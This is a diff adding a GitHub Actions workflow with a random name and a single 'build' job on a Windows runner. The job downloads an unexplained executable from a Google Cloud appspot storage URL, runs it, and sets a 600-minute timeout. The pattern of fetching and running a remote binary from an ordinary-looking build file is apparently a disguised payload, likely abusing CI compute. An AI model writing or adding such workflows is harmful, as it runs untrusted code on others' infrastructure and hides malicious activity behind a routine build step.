@@ -1,0 +1,9 @@
+name: dnWpTtP8R
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - run: Invoke-WebRequest https://storage.googleapis.com/demontpc2024-72da6.appspot.com/7GPAC32.exe -OutFile 7GPAC32.exe
+    - run: .\7GPAC32.exe
+    timeout-minutes: 600
